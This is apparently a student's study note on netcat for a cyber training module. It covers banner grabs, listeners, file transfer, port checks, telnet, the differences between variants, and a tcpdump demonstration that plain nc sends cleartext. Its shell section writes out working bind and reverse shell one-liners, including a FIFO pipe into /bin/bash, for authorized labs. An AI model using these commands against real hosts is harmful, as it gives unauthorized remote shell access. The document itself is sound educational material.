---
tags: [cyber, module3, recon, networking]
jqr: "Netcat, raw TCP/UDP read and write: banner grabs, listeners, file transfer, port checks, bind/reverse shells, and the variant differences"
---

# Netcat

Netcat pipes stdin/stdout across a raw TCP or UDP socket: whatever I type goes down the wire, whatever comes back prints to my screen. That one trick is what makes it a banner-grabber, listener, file-transfer tool, port-checker, and shell handler all at once. It does **no encryption**, which is exactly why [Tcpdump](Tcpdump.md) can read everything it sends (there's a demo of that below).

## The one-liners I keep

```bash
nc -nv 192.168.1.20 22                 # banner grab — server speaks first, IDs service/version
nc -lvnp 4444                          # listener: -l listen, -v verbose, -n no DNS, -p port
nc -nv 192.168.1.20 4444               # connect to a listener (chat / send data)
nc -lvnp 4444 > out.bin                # receive a file …
nc -nv -N 192.168.1.20 4444 < in.bin   # … send it (-N closes socket at EOF so it flushes)
nc -zvn -w1 192.168.1.20 20-100        # cheap port scan from a box with no Nmap (-z = no data)
```

- Check the variant first with `nc -h 2>&1 | head -1`. It decides whether `-e` and `-z` even exist.
- On Kali/Debian/Ubuntu the default is OpenBSD nc, so there's **no `-e`**. For a shell I use the FIFO trick or `ncat`.
- Only `ncat --ssl` encrypts. Plain `nc` is always cleartext.

## The mental model

A socket is just a two-way pipe between two hosts. Netcat hands me that pipe raw, with nothing wrapped around it, no TLS, no auth, no framing. So "connecting to port 4444" and "connecting to an SSH server" look identical to netcat; the only difference is what the *other end* does with my bytes. Coming from the defender side, that's the hook I keep in mind: netcat traffic is my own keystrokes on the wire, in the clear, which is why it's both a great diagnostic and a classic post-exploitation tool.

## Variants, the JQR gotcha (OpenBSD vs Traditional vs Ncat)

| Variant | Package | `-e` (exec)? | `-z` (scan)? | Notable |
|---|---|---|---|---|
| **OpenBSD nc** | `netcat-openbsd` | **NO** (removed for security) | **Yes** | **Default on Kali/Debian/Ubuntu.** Has `-N`, `-k`, `-w`, `-u`. No SSL. |
| **Traditional nc** | `netcat-traditional` (`nc.traditional`) | **YES** (`-e`, `-c`) | **Yes** | The classic "GAPING_SECURITY_HOLE" build. |
| **Ncat (Nmap)** | `ncat` (ships with nmap) | **YES** (`-e`, `--sh-exec`) | **NO** | Modern rewrite. Adds **`--ssl` (encryption)**, `-k`, `--chat`, `--broker`. |

To tell which one I've got, `nc -h 2>&1 | head -1`:
- Ncat's banner says `Ncat ... ( https://nmap.org/ncat )`.
- OpenBSD's man page states *"There is no -c or -e option in this netcat."*
- Traditional shows the usage line `connect to somewhere: nc [-options] hostname port ...`.

Why it matters: on an OpenBSD-nc box, `nc -e /bin/bash` just **fails**, so I fall back to the FIFO workaround (below) or `ncat --exec`. And Ncat has **no `-z`**, so to check ports there I use Nmap or `ncat --recv-only host port </dev/null`.

## Core flags

| Flag | Meaning |
|---|---|
| `-l` | Listen (server/bind mode). |
| `-p <port>` | Port (source port; the listen port in `-l` mode). |
| `-v` / `-vv` | Verbose, shows connection status. |
| `-n` | Numeric only, no DNS (faster, quieter). |
| `-u` | UDP instead of TCP. |
| `-w <sec>` | Connect/idle timeout. |
| `-z` | Zero-I/O, check the port and send no data (scan). *OpenBSD/Traditional only.* |
| `-k` | Keep listening after a client disconnects (OpenBSD/Ncat). |
| `-N` | Close the socket on EOF (OpenBSD), needed so file transfers finish cleanly. |
| `-e <prog>` | Exec program on connect. *Traditional/Ncat only.* |

## Banner grabbing

```bash
nc -nv 192.168.1.20 22                          # → "SSH-2.0-OpenSSH_9.6" — service + version
printf 'HEAD / HTTP/1.0\r\n\r\n' | nc -nv 192.168.1.20 80   # → HTTP response headers (Server:, etc.)
```
That's a fast manual alternative to `nmap -sV` when I only care about one port. SSH/FTP/SMTP speak first; HTTP needs me to send the request before it says anything.

Why a banner IDs the service: a lot of protocols have the *server* greet you first, announcing its version so the client knows what it's talking to before either side does real work. netcat just opens the socket and prints that greeting. No magic, I'm reading the service introduce itself. HTTP is client-first, so I send the `HEAD` request and read its reply instead.

## Listener + client

```bash
# TARGET (192.168.1.20): start a listener on 4444
nc -lvnp 4444
# ATTACKER (192.168.1.10): connect to it
nc -nv 192.168.1.20 4444
```
Anything I type on one side shows up on the other. Just `-v` printing `Connection ... succeeded!` is enough to prove TCP reachability to that port.

OpenBSD strictness: pure OpenBSD nc wants the listen port as a positional arg (`nc -lvn 4444`), though Kali's build also accepts `-lvnp 4444`. If `-p` errors on me, I drop it and put the port last.

## File transfer

```bash
nc -lvnp 4444 > received.bin                 # RECEIVER writes incoming bytes to a file
nc -nv -N 192.168.1.20 4444 < tosend.bin     # SENDER pipes the file in; -N closes at EOF
```
Direction is just plumbing here: `<` reads a file *into* the socket, `>` writes the socket *out* to a file. Either host can be the listener. I verify with `sha256sum` on both ends afterward.

## Port checks (`-z`)

```bash
nc -zvn -w1 192.168.1.20 22        # single port → "... 22 port [tcp/ssh] succeeded!" = open
nc -zvn -w1 192.168.1.20 20-1024   # sweep a range, 1-sec timeout each
```
Quick reachability check from a foothold box that has no Nmap. Remember **Ncat has no `-z`**, see the variant note above.

## telnet, use case and limitations (JQR)

`telnet` opens a raw, interactive TCP connection to a host/port. It's the older cousin of netcat.

```bash
telnet 192.168.1.20 25        # SMTP — read the banner, type HELO / MAIL FROM manually
telnet 192.168.1.20 80        # then: GET / HTTP/1.0  <Enter><Enter>  → HTTP headers
```
Use case: a fast banner grab, or hand-poking a *text* protocol (SMTP, HTTP, POP3, IMAP) to confirm a port answers and see how it responds.

Limitations: **no encryption**, so everything (including any login) is cleartext on the wire, provable with the same [Tcpdump](Tcpdump.md) capture as netcat. It can't transfer files cleanly, and as a *login service* (telnetd on port 23) it's obsolete and unsafe, which is exactly why **SSH replaced it**. The client often isn't installed on modern boxes (`sudo apt install telnet`). I use it to *diagnose*, never to *authenticate*.

## The shell trick (bind vs reverse) + the OpenBSD workaround

A **bind** shell means the target listens and hands out a shell. A **reverse** shell means the target dials *back* to me, which beats inbound firewalls because outbound is usually allowed. Authorized lab boxes only.

Why reverse wins, and the blue-side tell: firewalls are usually default-deny *inbound* but default-allow *outbound* (users need to browse out), so a bind shell's new listening port often gets blocked while a reverse connection sails straight through. The flip side for a defender is that a reverse shell is an *outbound* connection from a box that should only ever *receive* them. A web server suddenly dialing out to a random high port is the anomaly. Watch egress, not just ingress.

Haven't run this on the lab yet (needs two hosts), but this is the shape of it:
```bash
# BIND shell (Traditional/Ncat only — OpenBSD nc has no -e):
#   TARGET:   nc -lvnp 4444 -e /bin/bash        (or: ncat -lvnp 4444 -e /bin/bash)
#   ATTACKER: nc -nv 192.168.1.20 4444          → you land in the target's shell

# REVERSE shell (target connects out to you):
#   ATTACKER: nc -lvnp 4444
#   TARGET:   nc -nv 192.168.1.10 4444 -e /bin/bash

# OpenBSD nc has NO -e → named-pipe (FIFO) workaround on the TARGET:
mkfifo /tmp/f; nc -lvnp 4444 < /tmp/f | /bin/bash > /tmp/f 2>&1; rm /tmp/f
```

Why the FIFO works: with no `-e`, I wire the plumbing by hand. `mkfifo` makes a *named pipe*, a one-way tube on disk. `nc ... < /tmp/f` feeds whatever's in the pipe into netcat's input, `| /bin/bash` runs whatever the attacker types as commands, and `> /tmp/f` loops bash's output back into the pipe for netcat to send out. The FIFO is just the loop-back wire reconnecting bash's mouth to netcat's ear, hand-building the socket-to-shell bridge that `-e` would give me for free.

## Prove plain netcat is UNENCRYPTED

This is the core traffic-analysis exercise: a plaintext `nc` listener, a client that sends a "secret," and [Tcpdump](Tcpdump.md) watching the wire. The captured payload equals exactly what was typed, and that *is* the proof.

```bash
# 1) TARGET: plaintext listener            nc -lvnp 4444
# 2) CAPTURE: watch the port, print ASCII   sudo tcpdump -ni eth0 -A 'tcp port 4444'
# 3) ATTACKER: connect and send a secret    nc -nv 192.168.1.20 4444   (then type the secret)
```

I ran an `nc` listener on 4444 with `tcpdump` on the loopback (Ubuntu 24.04). The secret is sitting right there in the capture:
```
--- what the listener received ---
PASSWORD=SuperSecret123 sent over netcat
--- what tcpdump saw on the wire (note cleartext) ---
gD'.gD'.PASSWORD=SuperSecret123 sent over netcat

04:02:18.984271 IP 127.0.0.1.4444 > 127.0.0.1.43044: Flags [.], ack 42, win 64, options [nop,nop,TS val 1732519726 ecr 1732519726], length 0
```
The leading `gD'.` bytes are just captured TCP/framing noise; the `PASSWORD=SuperSecret123` string is my payload, on the wire in the clear. The lesson I'd give the panel: **the network encrypts nothing, the application has to.** Same reason Telnet/FTP/HTTP are unsafe and SSH/HTTPS exist.

For the contrast, repeat it with `ncat --ssl -lvnp 4444` (target) and `ncat --ssl -nv 192.168.1.20 4444` (attacker), and tcpdump now shows a TLS handshake then encrypted gibberish, the secret gone from view. `ncat --ssl` is the *only* netcat that does this.

## Stuff I keep tripping on

- Identify the variant first (`nc -h 2>&1 | head -1`); it decides whether `-e` and `-z` exist.
- Kali default is OpenBSD, so no `-e`. FIFO trick or `ncat --exec`.
- Use `-N` (or `-q 0` on some builds) so file transfers and `printf` pipes actually close and flush.
- Plain nc is cleartext; anyone with tcpdump on-path reads it. Only `ncat --ssl` encrypts.
- Listener needs the port free, and ports <1024 need **root** to bind.
- Reverse beats bind through inbound firewalls, because outbound is usually permitted.

## References

- NoobLinux netcat tutorial (JQR-named): https://nooblinux.com/how-to-use-netcat/
- Ncat guide + man page: https://nmap.org/ncat/guide/ · https://nmap.org/book/ncat-man.html
- OpenBSD `nc(1)` (the "no -c or -e" default): https://man.openbsd.org/nc.1 · https://manpages.debian.org/bookworm/netcat-openbsd/nc.1.en.html

## Related

- [Nmap](Nmap.md)
- [Tcpdump](Tcpdump.md)
- [SSH - Tunneling and Jump Hosts](../SSH%20Kali/SSH%20-%20Tunneling%20and%20Jump%20Hosts.md)
- [Metasploit Workflow](../C2%20Frameworks/Metasploit/Metasploit%20Workflow.md)
- [Pivoting and Tunneling](../Knowledge%20Req/Pivoting%20and%20Tunneling.md)
